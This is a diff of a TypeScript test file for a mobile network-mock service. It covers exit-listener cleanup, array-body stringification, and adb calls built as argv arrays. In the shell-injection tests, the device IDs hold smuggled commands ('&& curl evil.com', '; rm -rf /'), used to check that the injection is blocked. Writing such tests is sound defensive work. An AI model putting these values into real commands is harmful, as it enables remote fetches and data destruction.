@@ -1,16 +1,20 @@
 /**
- * TDD tests for P1 lifecycle/correctness fixes:
+ * TDD tests for P1 lifecycle/correctness fixes (+ P1-B follow-ups):
  *   ITEM 1 — stripPlatformPrefix for tcp-serial resourceIds
  *   ITEM 2 — ownerRunId cross-run teardown guard
  *   ITEM 3 — TTL timer cleared on stop (process exit failsafe is integration-only)
  *   ITEM 4 — iOS rejected loudly
  *   ITEM 5 — object body in validate.ts JSON-stringified
+ *   FIX 1 — signal handler deregisters the "exit" listener (cleanup runs once)
+ *   FIX 2 — device-proxy adb calls use an argv array (no shell injection)
+ *   FIX 3 — array body JSON-stringified ([1,2,3] not "1,2,3")
  */
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { validateVisualFlow } from "../mcp/visual-flow/index.js";
 import { stripPlatformPrefix } from "../mcp/server.js";
 import { NetworkMockService } from "../mcp/network-mocks/NetworkMockService.js";
+import { configureDeviceProxy, removeDeviceProxy, buildSetProxyArgs } from "../mcp/network-mocks/device-proxy.js";
 
 // ─── ITEM 1: stripPlatformPrefix ──────────────────────────────────────────────
 
@@ -89,12 +93,47 @@ test("TTL: armTtl replaces any existing timer (no double-registration)", () => {
   if ((svc as any)._ttlTimer) { clearTimeout((svc as any)._ttlTimer); (svc as any)._ttlTimer = null; }
 });
 
+// ─── FIX 1: signal handler deregisters the "exit" listener (cleanup once) ─────
+
+test("exit failsafe: signal handler removes the 'exit' listener so cleanup can't double-fire", () => {
+  const svc = new NetworkMockService() as any;
+  // Pretend a mock is active so the exit handler would do work.
+  svc.activeConfig = { platform: "android", deviceId: "emulator-5554" };
+  const beforeExit = process.listenerCount("exit");
+  const beforeInt = process.listenerCount("SIGINT");
+  const beforeTerm = process.listenerCount("SIGTERM");
+
+  svc._registerExitFailsafe();
+  assert.equal(process.listenerCount("exit"), beforeExit + 1, "exit handler registered");
+  assert.equal(process.listenerCount("SIGINT"), beforeInt + 1);
+  assert.equal(process.listenerCount("SIGTERM"), beforeTerm + 1);
+
+  // The signal handler calls _removeExitFailsafe() BEFORE re-raising. Simulate that
+  // and assert ALL listeners (incl. "exit") are gone, so process exit won't re-run cleanup.
+  svc._removeExitFailsafe();
+  assert.equal(process.listenerCount("exit"), beforeExit, "exit listener must be removed (no double-fire)");
+  assert.equal(process.listenerCount("SIGINT"), beforeInt);
+  assert.equal(process.listenerCount("SIGTERM"), beforeTerm);
+});
+
+test("exit failsafe: stop() removes all process listeners (suite exits clean)", async () => {
+  const svc = new NetworkMockService() as any;
+  svc.activeConfig = { platform: "android", deviceId: "emulator-5554" };
+  const beforeExit = process.listenerCount("exit");
+  svc._registerExitFailsafe();
+  assert.equal(process.listenerCount("exit"), beforeExit + 1);
+  // activeConfig is set but server isn't really listening; stop() must still deregister.
+  await svc.stop();
+  assert.equal(process.listenerCount("exit"), beforeExit, "stop() must leave no leaked exit listener");
+});
+
 // ─── ITEM 4: iOS rejected loudly ─────────────────────────────────────────────
 
 test("NetworkMockService.start rejects platform=ios with a clear error", async () => {
   const svc = new NetworkMockService();
   await assert.rejects(
-    () => svc.start({ rules: [], platform: "ios", deviceId: "some-udid" }),
+    // cast: the param is now "android"-only; this exercises the runtime guard
+    () => svc.start({ rules: [], platform: "ios" as "android", deviceId: "some-udid" }),
     (err: unknown) => {
       assert.ok(err instanceof Error, "must throw an Error");
       const msg = err.message.toLowerCase();
@@ -110,7 +149,7 @@ test("NetworkMockService.start rejects platform=ios with a clear error", async (
 test("NetworkMockService.start rejects any non-android platform loudly", async () => {
   const svc = new NetworkMockService();
   await assert.rejects(
-    () => svc.start({ rules: [], platform: "harmony" as "android" | "ios", deviceId: "dev" }),
+    () => svc.start({ rules: [], platform: "harmony" as "android", deviceId: "dev" }),
     (err: unknown) => {
       assert.ok(err instanceof Error);
       return true;
@@ -169,4 +208,59 @@ test("validate: null body is still rejected (body required)", () => {
     responses: [{ body: null }],
   }));
   assert.equal(result.ok, false, "null body must be rejected");
+});
+
+// ─── FIX 3: array body JSON-stringified ──────────────────────────────────────
+
+test("validate: array body is JSON-stringified to '[1,2,3]' (not '1,2,3')", () => {
+  const result = validateVisualFlow(minimalFlowWithMock({
+    hostRegex: "api\\.example\\.com$",
+    responses: [{ body: [1, 2, 3] }],
+  }));
+  assert.equal(result.ok, true, `expected ok, got: ${(result as any).message}`);
+  if (result.ok) {
+    const body = result.value.networkMocks?.[0]?.responses?.[0]?.body;
+    assert.equal(body, "[1,2,3]", `expected JSON array string, got: ${body}`);
+    assert.notEqual(body, "1,2,3");
+  }
+});
+
+// ─── FIX 2: device-proxy adb calls use an argv array (no shell injection) ─────
+
+test("buildSetProxyArgs: deviceId is a discrete argv element, not a shell string", () => {
+  const evil = "emulator-5554 && curl evil.com";
+  const args = buildSetProxyArgs(evil, "10.0.2.2:8080");
+  // The malicious deviceId appears verbatim as ONE element — never split/joined into a shell string
+  assert.ok(args.includes(evil), "deviceId must be passed verbatim as one argv element");
+  assert.equal(args[0], "-s");
+  assert.equal(args[1], evil);
+  // No element is a single joined shell command line
+  assert.ok(!args.some((a) => a.includes("&&") && a.includes("adb")), "no joined shell command");
+});
+
+test("configureDeviceProxy: runner receives adb + argv array; metachar deviceId is not shell-interpreted", () => {
+  const calls: Array<{ file: string; args: string[] }> = [];
+  const evil = "dev; rm -rf /";
+  configureDeviceProxy(
+    { platform: "android", deviceId: evil, proxyHost: "10.0.2.2", proxyPort: 8080 },
+    (file, args) => { calls.push({ file, args }); },
+  );
+  assert.equal(calls.length, 1);
+  assert.equal(calls[0]!.file, "adb");
+  // deviceId is one discrete argv element, so the shell never sees "; rm -rf /"
+  assert.ok(calls[0]!.args.includes(evil), "evil deviceId stays one argv element");
+  assert.deepEqual(calls[0]!.args, ["-s", evil, "shell", "settings", "put", "global", "http_proxy", "10.0.2.2:8080"]);
+});
+
+test("removeDeviceProxy: runner receives the clear-proxy argv for android", () => {
+  const calls: Array<{ file: string; args: string[] }> = [];
+  removeDeviceProxy("android", "emulator-5554", (file, args) => { calls.push({ file, args }); });
+  assert.equal(calls.length, 1);
+  assert.deepEqual(calls[0]!.args, ["-s", "emulator-5554", "shell", "settings", "put", "global", "http_proxy", ":0"]);
+});
+
+test("removeDeviceProxy: ios is a no-op (no adb call)", () => {
+  const calls: Array<{ file: string; args: string[] }> = [];
+  removeDeviceProxy("ios", "some-udid", (file, args) => { calls.push({ file, args }); });
+  assert.equal(calls.length, 0, "ios must not invoke adb");
 });
